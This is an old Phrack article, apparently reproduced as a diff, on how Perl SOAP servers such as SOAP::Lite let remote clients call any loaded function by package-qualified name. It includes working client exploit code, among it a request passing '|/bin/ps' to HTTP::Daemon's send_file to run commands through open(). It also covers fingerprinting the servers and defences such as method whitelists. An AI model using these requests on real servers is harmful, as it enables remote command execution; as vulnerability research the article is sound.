@@ -1,0 +1,471 @@
+                             ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x3a, Phile #0x09 of 0x0e
+
+|=-------------=[ RPC without borders (surfing USA ...) ]=---------------=|
+|=-----------------------------------------------------------------------=|
+|=----------------=[ stealth <stealth@segfault.net>  ]=------------------=|
+
+
+--[ Introduction
+
+  In this article I will explain weaknesses as they already exist in
+today's remote object access technologies (focusing on the new 
+SOAP -- Simple Object Access Protocol) or may show up in future. I will
+give a small walk-around on things already available and will explain why
+they are used and why it makes sense to use it. Since the topic is *that*
+large, I can only give you basic ideas of how these things work in general;
+but I focus on a SOAP implementation in Perl later, where I explain in
+depth how things break, and will try to 'port' the ideas then. References
+are given in the end so you may try to figure out remote object access
+yourself -- its a damn interesting thing. :-)
+
+
+--[ 1. The new RPCs
+
+  RPC as you know it has been used in a lot of services for decades such
+as in NIS or NFS. However these have never been available to multi-tier
+applications and web-applications in paricular (or at least RPC wasn't
+really made for it).
+
+  Since a few years, 'RPC over XML', so called "XML-RPC" has been defined
+which should enable developers (web-developers in paricular) to _easily_
+use the RPC capability which has been available to system-programmers for
+years. Application-developers today use CORBA (Common Object Request Broker
+Architecture), which (in short) adds the ability of accessing objects
+remotely with RPC. Since the blinking OO world began, developers felt they
+need to access objects remotely and they are quite happy with CORBA. It
+allows nice things such as
+
+     today = TimeServer_ptr->date();
+
+that is it looks like you are accessing a local object, but indeed it is
+located on some other box. The underlying so called "Middleware" libraries
+translate this call into sending data in a special format to the server
+which invokes the request on an object the server registered for remote
+usage.
+
+  The reason for this is that programs have grown so much in recent years
+that programmers want to have easy ways to access ressources remotely,
+without the pain of platform-specifics such as byte-ordering, different
+socket-semantics etc. etc.. There also exist a lot of tools and
+pre-compilers which do a lot of work for the programmer already (such as
+translating an interface-description into valid C++ code).
+
+  Everything is fine except it is a _bit_ complicated and our
+web-application-developers probably do not use it at all, so the need for
+an easy to access and straight to implement CORBA-replacement (read
+'replacement' as 'we are happy with it, but isn't there an easier way?')
+seemed to be necessary. 
+
+  XML-RPC was there already, so why not building a remote object access
+facility on top of it? SOAP was born. It allows you to call methods on
+objects remotely, similar to the example above.  Somewhat like OO XML-RPC.
+
+  Unlike the 'normal' RPC where program and version-numbers were required
+to specify which function should be called, XML-RPC allows you to send the
+full functionname across the socket enveloped into a XML document. You
+usually need to register the objects (with the corresponding methods) which
+may be accessed from the outside; at least when I wrote a distributed
+banking-application in C++ using CORBA, it worked that way ;-). This is
+also true for SOAP technology, as I will explain a few lines later,
+(indeed, I do not care much about SOAP specification, but on the specific
+implemenatations) but this time we may send function and object-names as
+strings and we will see registering objects does not make the whole thing
+secure as it is expected to be.
+
+
+--[ 2. why Perl
+
+  I will focus on Perl implementations of SOAP because Perl has the special
+capability to call functions indirectly:
+
+
+#!/usr/bin/perl -w
+
+use POSIX;
+
+sub AUTOLOAD
+{
+        print "AUTOLOAD: called $AUTOLOAD(@_)\n";
+}
+
+
+sub func1
+{
+        print "called func1(@_)\n";
+}
+
+
+$name = "POSIX::system";
+
+$name->("/usr/bin/id");
+
+
+  Isn't that nice, we can specify at runtime which function is called via
+$name, POSIX::system in this case. Every unknown function you try to invoke
+i.e. POSIX::nonexisiting will trigger the AUTOLOAD subroutine which is a
+special gift from Perl. That way, you may load unloaded stuff at runtime
+when you notice that a function-call does not 'resolve'. Things are even
+better, because indirect function-calls also work fine with tainted data!
+
+
+#!/usr/bin/perl -w -T
+
+use POSIX;
+
+$ENV{PATH}="/usr/bin";
+$ENV{ENV}="";
+
+sub AUTOLOAD
+{
+	print "AUTOLOAD: called $AUTOLOAD(@_)\n";
+}
+
+
+sub func1
+{
+	print "called func1(@_)\n";
+}
+
+for (;;) {
+	print "Enter function-name: ";
+	$name = <STDIN>; chop $name;
+	print "Enter argument: ";
+	$arg = <STDIN>; chop $arg;
+	$name->($arg);
+}
+
+
+Giving "func1" and "that" as input will call
+
+       func1("that");
+
+even when in tainted mode. Though, it breaks with "POSIX::system" and
+"/bin/sh" because tainted data would be passed to CORE::system() function
+at the end which is forbidden. AUTOLOADing also works with tainted data.
+
+Let's just write that to our Notitzblock:
+
+  'Perl allows functions to be called indirectly, no matter
+   whether it is in tainted mode or not and the name/argument
+   of that function is retrieved from outside or not.'
+
+
+--[ 3. How things work
+
+  Lets now start right away with a Demo-program that uses SOAP::Lite
+[soaplite] to show what XML-RPC means:
+
+#!/usr/bin/perl -w
+
+use SOAP::Transport::HTTP;
+
+$daemon = SOAP::Transport::HTTP::Daemon
+    -> new (LocalPort => 8081)
+    -> dispatch_to('Demo');
+
+print "Contact to SOAP server at ", $daemon->url, "\n";
+$daemon->handle;
+
+sub authenticated
+{
+        return "Hi @_, you are authenticated now!";
+}
+
+package Demo;
+
+sub callme
+{
+        return "called callme";
+}
+
+
+  Ok. That was basicly taken from a How-to-use-SOAP guide from [soaplite].
+What you do here is starting a small HTTP-server which listens on port 8081
+and delegates the XML-RPC's to the package 'Demo'. That way, clients may
+call the callme() function remotely. HTTP is used here, but SOAP works
+protocol-independant, so you may use SMTP or whatever here - there are lots
+of modules shipped with SOAP::Lite. Calling a function basicly works by
+POSTing a XML-document to this server now. Here is a small client calling
+the offered function "callme()":
+
+#!/usr/bin/perl -w
+
+use SOAP::Lite;
+
+my $soap = new SOAP::Lite;
+
+# when using HTTP::Daemon, build client like this
+if (1) {
+	$soap->uri('http://1.2.3.4/Demo');
+	$soap->proxy('http://1.2.3.4:8081/');
+} else {
+	# if SOAP server is CGI, call like this
+	$soap->uri('http://1.2.3.4/Demo');
+	$soap->proxy('http://1.2.3.4/cgi-bin/soap.cgi');
+}
+
+print $soap->callme()->result();
+
+  proxy() allows you to specify which server to contact for the
+remote-service. It's not an HTTP-proxy as you know them from usual web
+stuff. uri() is used to distinguish between the classes the server offers
+(coz he may offer more than one). You can see it later in the HTTP-header
+sent to the server in the SOAPAction field. As you see, CGI scripts may be
+used to offer the service, but thats slower than HTTP::Daemon, so we do not
+discuss it here further (it's the same exploiting technique anyways...).
+
+And thats it! Isnt that nice? RPC can't be easier. The
+
+	$soap->callme()
+
+is translated by SOAP::Lite's AUTOLOADer into a
+$soap->call("callme"); functioncall which produces the
+following XML-document then sent to remote port 8081:
+(HTTP-header stripped, output formatted)
+
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:
+ SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
+ SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
+ xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
+ xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"
+ xmlns:xsd="http://www.w3.org/1999/XMLSchema">
+    <SOAP-ENV:Body>
+        <namesp1:callme xmlns:namesp1="http://1.2.3.4/Demo"/>
+    </SOAP-ENV:Body>
+</SOAP-ENV:Envelope>
+
+
+  Just to show you that the functionname is passed to remote-side as
+string. Got an idea now where we will go today? :-) To make things complete
+here's the result:
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:
+ SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
+ SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
+ xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
+ xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"
+ xmlns:xsd="http://www.w3.org/1999/XMLSchema">
+    <SOAP-ENV:Body>
+        <namesp7:callmeResponse xmlns:namesp7="http://1.2.3.4/Demo">
+            <s-gensym35 xsi:type="xsd:string">
+                called callme
+            </s-gensym35>
+        </namesp7:callmeResponse>
+    </SOAP-ENV:Body>
+</SOAP-ENV:Envelope>
+
+  Sucess. I am not going to explain that, as it's first not further of
+interest and second the bookstore where I ordered a book on SOAP did not
+send me the book yet.
+
+
+--[ 4. How things break
+
+  Why not trying to call other functions which do not belong to the
+package? I guess main::authenticated() would be a nice target.
+
+#!/usr/bin/perl -w
+
+use SOAP::Lite;
+
+my $soap = new SOAP::Lite;
+
+# when using HTTP::Daemon, build client like so
+if (1) {
+        $soap->uri('http://1.2.3.4/Demo');
+        $soap->proxy('http://1.2.3.4:8081/');
+} else {
+        # if SOAP server is CGI, call like so
+        $soap->uri('http://1.2.3.4/Demo');
+        $soap->proxy('http://1.2.3.4/cgi-bin/soap.cgi');
+}
+
+print $soap->call("X:main::authenticated" => "me")->result();
+
+
+(Do not ask for code-dup! :-)
+
+Running against the server seen above:
+
+stealth@linux:SOAP> ./c.pl
+Hi Demo me, you are authenticated now!stealth@linux:SOAP>
+
+  Wow! "Demo" and "me" are both arguments to authenticated().
+Thats because of how SOAPLite works:
+
+...
+$class->$method_name(SOAP::Server::Object->objects(@parameters))
+...
+
+  The three dots before the method-call parse the XML-document, retrieving
+class-name method-uri and method-name from it. Actually,
+
+Demo->main::authenticated("me");
+
+is executed by means of our client-request. That yields 'Demo' in @_. That's
+aready the most problematic part of SOAP-implemenatations in Perl. It
+allows you to call any function on (in case of SOAP::Lite) any package.
+
+  We used main:: in this example but it might be POSIX::system() too. There
+are other SOAP modules than SOAP::Lite which we could use here, but they also
+suffer on the same problem. Even when you are not able to specify the
+class-name, that is the SOAP implementation has
+
+sub handler
+{
+        # Dave Developer: we are safe, restricting
+        # access to Calculator package
+        Calculator->$method($args);
+        ...
+}
+
+
+you are able to 'breakout' of the package Calculator by giving the full
+package-name to $method (main::authenticated in above case). It is
+something like *package reverse traversal*. That's the whole point. Again,
+this will work in tainted mode too! A note on SOAP-namespaces: You have
+probably seen that we sent indeed 'X:main::authenticated' (prepended 'X:').
+Do not ask why, but there is a prefix needed in SOAP::Lite case, otherwise
+the remote XML-Parser will complain. On the other hand another SOAP module
+required to have i.e. POSIX as namespace and system as method which
+assembled to POSIX::system on the other end. The XML-document generated by
+that module produced somehow wrong package::method invokations, so I had to
+handle that with raw port 80/HTTP requests by myself. Seems that either I
+got namespace-handling wrong or the module parsing was broken. (Probably
+first case, I said the book did not arrived yet, no? :-)
+
+  Hm. I just remember perl has some nice tricks which are possible via
+open(). Let's see whether we can find some. My requires-script shows me that
+SOAP::Transport::HTTP requires HTTP::Daemon (via 'new' call that is invoked
+by the server, so it's available at runtime). Let's just look at HTTP::Daemon
+package:
+
+...
+package HTTP::Daemon::ClientConn;
+...
+sub send_file
+{
+    my($self, $file) = @_;
+    my $opened = 0;
+    if (!ref($file)) {
+        local(*F);
+        open(F, $file) || return undef;
+...
+
+  Ayeee! An unprotected open() call. To the client we wrote above, add
+
+$soap->call("X:HTTP::Daemon::ClientConn::send_file" => "|/bin/ps");
+
+which will call Demo->HTTP::Daemon::ClientConn::send_file("|/bin/ps");
+which is HTTP::Daemon::ClientConn::send_file(Demo, "|/bin/ps"); where only
+the second argument is of interest ($file for the open-call :-).
+
+  OK. I think now you have got an idea of what's going on here, even when
+the open() call would not be there, it's still dangerous enough as we may
+call *any*, let me repeat, *any* function in the Perl-daemon that is
+availabe at runtime (either in main-package or a package that is 'use'ed
+or 'require'd, except CORE which is not accessible).
+
+
+--[ 5. Tritt ein, bring Glueck herein. 
+
+  It might be of interest to detect whether on a given port a SOAP-Lite
+server is running. Nothing easier than this:
+
+stealth@linux:SOAP> telnet 127.0.0.1 32887
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+POST /x.pl / HTTP 1.1
+<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope
+xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
+SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
+xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/1999/XMLSchema"><SOAP-ENV:Body>
+<SOAP-ENV:Fault><faultcode
+xsi:type="xsd:string">SOAP-ENV:Client</faultcode><faultstring
+xsi:type="xsd:string">Application failed during request deserialization:
+no element found at line 1, column 0, byte -1 at
+/usr/lib/perl5/site_perl/5.6.1/i586-linux/XML/Parser.pm line 185
+</faultstring><faultactor
+xsi:type="xsd:string">http://linux:32887/</faultactor></SOAP-ENV:Fault>
+</SOAP-ENV:Body></SOAP-ENV:Envelope>Connection
+closed by foreign host.
+
+
+  As you see, SOAP-Lite is very verbose in its error-messages. Important
+line is
+
+/usr/lib/perl5/site_perl/5.6.1/i586-linux/XML/Parser.pm
+
+which tells us that Perl is used, and that's it.
+
+  The classnames are usually described elsewhere to give programmers of the
+clients all necessary information. Very often the site that runs the SOAP
+service describes on their website how its interferred with. However, if
+SOAP becomes widespread one day its probably needed to find better scanning
+techniques.
+
+
+--[ 6. No trespassing
+
+  It is very interesting that people think security is when they use HTTPS
+instead of HTTP. I have seen 'secure' SOAP servers which just used HTTPS
+as underlying protocol and were declared as 'secure servers'.
+
+  So, how to protect? Difficult. The -T switch to force tainted mode works
+against direct shell-escapes but being able to call any internal daemon
+function is bad enough. Maybe the package-qualifiers "::" should be
+stripped. If you allow them it's like allowing ".." in pathnames which leads
+to reverse traversal (there are better ways to protect against reverse
+traversal than stripping "..", though) in some cases. Tainting the
+functionname that comes via the socket will disallow _any_ RPC.
+
+  A way might be to put all allowed classes and function-names into a hash
+and look whether the received string is contained there. Frontier XML-RPC
+module for Perl does it that way, it has a hash of methods it allows like
+
+my %funcs = ('callme' => \&sub1);
+
+where you may only call 'callme' function. You can try to call other
+functions until your face turns into green, you won't suceed.
+
+  To be fair, I must admit that the SOAP specification [SOAP] explicitely
+says it does not cover security-releated stuff. Some companies published
+papers on SOAP security right when I was exploiting my test-servers.
+Though, they are almost all releated to encryption and signing topics, just
+a few cover access-control such as [big-blue].
+
+  This is not just a Perl issue AFAIK, because other languages also allow
+indirect calling of functions, such as JAVA or PHP. :-) I did not look at
+JAVA or CORBA for Perl but I would not be surprised if similar problems
+exist there too.
+
+
+--[ 7. References
+
+[soaplite] The SOAP::Lite implementation for Perl
+http://www.soaplite.com
+I tested SOAP::Lite 0.51 and SOAP 0.28 for Perl.
+
+[] A list of some sites who offer XML-RPC service, just to
+show you it is used at all:
+http://www.xmlrpc.com/directory/1568/services
+
+[] Mailinglists, links, docu etc. on SOAP:
+http://soapware.org
+
+[SOAP] SOAP 1.1 specification
+http://www.w3.org/TR/2000/NOTE-SOAP-20000508/
+
+[big-blue] SOAP security whitepaper
+http://www.trl.ibm.com/projects/xml/soap/wp/wp.html
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
